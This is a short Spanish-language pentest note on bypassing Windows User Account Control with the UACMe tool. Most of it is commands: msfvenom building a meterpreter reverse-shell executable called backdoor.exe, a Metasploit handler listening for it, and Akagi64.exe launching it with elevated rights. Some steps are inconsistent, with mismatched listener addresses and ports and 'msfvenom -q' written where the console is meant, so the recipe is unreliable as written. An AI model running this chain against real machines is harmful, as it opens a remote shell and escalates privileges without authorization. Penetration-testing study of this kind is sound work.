# Bypassing UAC With UACMe

Tags: #Windows #Bypassing #UAC

User Account Control (UAC) es una característica de seguridad de Windows introducida en Windows Vista, usada para prevenir cambios no autorizados desde el sistema operativo. UAC es usado para asegurar que los cambios en el sistema operativo sean aprobados por el admin o cuenta del usuario. 
Los atacantes pueden hacer Bypass UAC para ejecutar archivos ejecutables maliciosos para elevar privilegios. 

[![UAC.png](https://i.postimg.cc/nr0DF9j1/UAC.png)](https://postimg.cc/fSSL5Lv3)

Para que sea exitoso el Bypassing debemos tener acceso a una cuenta que sea parte de un grupo local de administradores.
Existen diferentes herramientas y técnicas para poder hacer le Bypassing, sin embargo, esto dependerá de la versión de Windows que se este ejecutando en el sistema. 

* [UACMe](https://github.com/hfiref0x/UACME)   Esta herramienta funciona desde Windows 7 a Windows 10
```bash 
# HFS 2.3 es el nombre de la vulnerabilidad que podemos explotar con Metasploit y manualmente con UACMe
```

Creamos nuestro Payload
```bash
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f exe > backdoor.exe

	# p = Payload
	# f = Formato
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
```

```bash 
# Si ya tenemos un archivo malicioso hecho en msfvenom listo para ejecutar en el servidor victima, podemos hacer lo siguiente y nos pondriamos en 'listening'
❯ msfvenom -q                  # q = Quitar el banner de inicio

	❯ use multi/handler                 
	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
	❯ options
	❯ set LHOST 192.168.68.1                     
	❯ set LPORT 1234
	❯ run
```

Subimos el payload llamado backdoor.exe a la maquina victima, así como el Akagi64.exe
```bash 
❯ .\Akagi64.exe <Key> C:\Temp\backdoor.exe

	# Key = Numero de ID que va desde el 1 al 23, esto dependera del Windows que se este ejecutando 
```